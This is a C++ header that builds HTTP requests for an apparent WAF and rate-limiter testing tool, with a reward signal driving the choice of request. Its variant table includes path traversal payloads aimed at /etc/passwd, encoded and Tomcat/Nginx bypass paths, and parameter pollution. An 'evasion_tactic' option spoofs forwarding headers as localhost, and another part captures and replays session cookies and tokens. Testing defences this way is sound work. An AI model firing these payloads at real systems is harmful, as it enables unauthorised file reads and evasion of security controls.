#pragma once

// Request-variant table for the `request_mix` Mahoraga lever.
//
// request_mix selects WHICH request the L7 worker emits from a small, fixed set
// of benign but distinct HTTP shapes. A defended target (WAF + rate limiter)
// reacts differently to each — a query-bearing search path, an API path, a
// state-changing POST, a cacheable static asset, and normalization/traversal edge
// shapes land in different WAF rule groups and rate-limit buckets — so the captured
// corpus gains a shaping dimension the reward actually responds to.
//
// Header-only + dependency-free so both the L7 worker and its ABI selftest use
// the exact same table (single source of truth for the index -> request map).

#include <cstddef>
#include <cstdint>
#include <string>

namespace samurai::l7 {

struct RequestVariant {
  const char* method;
  const char* path;
};

// Canonical variants, indexed by request_mix. Index 0 is the historical default
// (GET /), so request_mix=0 reproduces prior behavior exactly.
// Expanded attack & fuzzing matrix for WAF / IPS / IDS resilience testing:
inline constexpr RequestVariant kRequestVariants[] = {
    {"GET", "/"},                                     // 0 baseline root
    {"GET", "/search?q=samurai"},                     // 1 query param — trips WAF query inspection
    {"GET", "/api/v1/status"},                        // 2 API path — separate limit bucket
    {"POST", "/login"},                               // 3 state-changing auth endpoint — rate-limited
    {"GET", "/static/app.js"},                        // 4 static asset — cacheable, distinct bucket
    {"GET", "/static/../../etc/passwd"},              // 5 Path Traversal (dot-dot-slash)
    {"GET", "/public/..%2f..%2fetc/passwd"},          // 6 URL-encoded Path Traversal (%2f)
    {"GET", "/..;/..;/"},                             // 7 Matrix parameter traversal (Tomcat/Nginx bypass)
    {"GET", "/search?q=1&q=samurai"},                 // 8 HTTP Parameter Pollution (HPP)
    {"GET", "/%2e%2e/"},                              // 9 Fuzzy / Hex-encoded traversal (/%2e%2e/)
    {"GET", "//multiple//slashes"},                   // 10 Consecutive slashes URL normalization
    {"GET", "/static/%2e%2e/%2e%2e/etc/passwd"},     // 11 Multi-level fuzzy traversal
};

inline constexpr std::size_t kRequestVariantCount =
    sizeof(kRequestVariants) / sizeof(kRequestVariants[0]);

// The variant for `request_mix`, wrapping out of range so any policy/exploration
// draw maps to a defined request instead of falling off the table.
inline const RequestVariant& VariantFor(std::uint32_t request_mix) {
  return kRequestVariants[request_mix % kRequestVariantCount];
}

// Session context pool: holds access tokens and session cookies captured
// from responses (e.g. Set-Cookie, JSON auth tokens) across requests.
struct SessionContext {
  std::string access_token;
  std::string cookie;
  bool has_token{false};
  bool has_cookie{false};

  void UpdateFromResponse(const std::string& headers, const std::string& body) {
    // 1. Extract Set-Cookie header(s)
    const std::string sc_key = "Set-Cookie:";
    std::size_t sc_pos = 0;
    while ((sc_pos = headers.find(sc_key, sc_pos)) != std::string::npos) {
      std::size_t start = sc_pos + sc_key.size();
      while (start < headers.size() && (headers[start] == ' ' || headers[start] == '\t')) {
        start++;
      }
      std::size_t end = headers.find("\r\n", start);
      if (end == std::string::npos) end = headers.find('\n', start);
      if (end == std::string::npos) end = headers.size();

      std::string cookie_line = headers.substr(start, end - start);
      std::size_t semi = cookie_line.find(';');
      std::string cookie_pair = (semi != std::string::npos) ? cookie_line.substr(0, semi) : cookie_line;
      if (!cookie_pair.empty()) {
        if (!cookie.empty()) cookie += "; ";
        cookie += cookie_pair;
        has_cookie = true;
      }
      sc_pos = end;
    }

    // 2. Extract access_token or token from JSON body or headers
    auto extract_json_val = [](const std::string& text, const std::string& key) -> std::string {
      std::size_t pos = text.find(key);
      if (pos == std::string::npos) return "";
      pos = text.find(':', pos + key.size());
      if (pos == std::string::npos) return "";
      pos = text.find('"', pos);
      if (pos == std::string::npos) return "";
      std::size_t end = text.find('"', pos + 1);
      if (end == std::string::npos) return "";
      return text.substr(pos + 1, end - pos - 1);
    };

    std::string tok = extract_json_val(body, "\"access_token\"");
    if (tok.empty()) tok = extract_json_val(body, "\"token\"");
    if (tok.empty()) tok = extract_json_val(headers, "Bearer ");
    if (!tok.empty()) {
      access_token = tok;
      has_token = true;
    }
  }
};

struct Http1BuildOptions {
  std::string host{"localhost"};
  bool keep_alive{false};
  std::string auth_payload;
  std::uint32_t auth_mode{0};       // 0: Anonymous, 1: Bearer JWT, 2: Session Cookie
  std::uint32_t evasion_tactic{0};  // 0: Normal, 1: Path Traversal, 2: URL Encoded, 3: Header Spoofing
  const SessionContext* session{nullptr};
};

// Build a complete HTTP/1.1 request line + headers for the selected variant.
inline std::string BuildHttp1Request(std::uint32_t request_mix, const Http1BuildOptions& opts) {
  const RequestVariant& v = VariantFor(request_mix);
  const std::string h = opts.host.empty() ? std::string("localhost") : opts.host;

  std::string path = v.path;
  if (opts.evasion_tactic == 1 && path == "/") {
    path = "/../../etc/passwd";
  } else if (opts.evasion_tactic == 2 && path == "/") {
    path = "/%2e%2e/";
  }

  std::string req = std::string(v.method) + " " + path + " HTTP/1.1\r\n" +
                    "Host: " + h + "\r\n" +
                    "User-Agent: samurai-l7-worker\r\n";

  if (opts.evasion_tactic == 3) {
    req += "X-Forwarded-For: 127.0.0.1\r\n"
           "X-Originating-IP: 127.0.0.1\r\n"
           "X-Real-IP: 127.0.0.1\r\n";
  }

  // Auth headers injection
  if (opts.auth_mode == 1) {
    if (opts.session && opts.session->has_token) {
      req += "Authorization: Bearer " + opts.session->access_token + "\r\n";
    } else {
      req += "Authorization: Bearer null\r\n";
    }
  } else if (opts.auth_mode == 2) {
    if (opts.session && opts.session->has_cookie) {
      req += "Cookie: " + opts.session->cookie + "\r\n";
    }
  } else if (opts.session) {
    if (opts.session->has_token) {
      req += "Authorization: Bearer " + opts.session->access_token + "\r\n";
    }
    if (opts.session->has_cookie) {
      req += "Cookie: " + opts.session->cookie + "\r\n";
    }
  }

  const bool is_post = (std::string(v.method) == "POST");
  if (is_post) {
    if (!opts.auth_payload.empty()) {
      req += "Content-Type: application/json\r\n";
      req += "Content-Length: " + std::to_string(opts.auth_payload.size()) + "\r\n";
    } else {
      req += "Content-Length: 0\r\n";
    }
  }

  if (opts.keep_alive) {
    req += "Connection: keep-alive\r\n\r\n";
  } else {
    req += "Connection: close\r\n\r\n";
  }

  if (is_post && !opts.auth_payload.empty()) {
    req += opts.auth_payload;
  }
  return req;
}

// Historical overload: baseline host and Connection: close for backwards compatibility.
inline std::string BuildHttp1Request(std::uint32_t request_mix, const std::string& host) {
  Http1BuildOptions opts;
  opts.host = host;
  opts.keep_alive = false;
  return BuildHttp1Request(request_mix, opts);
}

}  // namespace samurai::l7
